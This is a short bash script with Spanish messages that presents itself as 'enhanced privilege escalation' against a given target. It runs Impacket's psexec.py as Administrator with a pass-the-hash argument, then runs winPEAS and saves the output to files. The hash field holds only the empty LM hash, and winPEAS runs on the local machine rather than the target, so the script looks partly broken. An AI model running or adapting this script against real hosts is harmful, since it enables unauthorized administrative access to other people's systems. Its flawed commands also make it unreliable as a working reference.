#!/bin/bash

if [ -z "$1" ]; then
    echo "Uso: $0 <target>"
    exit 1
fi

TARGET=$1

echo "Iniciando escalación de privilegios mejorada en $TARGET"
psexec.py Administrator@$TARGET -hashes :aad3b435b51404eeaad3b435b51404ee "whoami" | tee custom_priv_esc_$TARGET.txt
winpeas.exe > custom_priv_esc_winpeas_$TARGET.txt

echo "Escalación de privilegios completada en $TARGET"
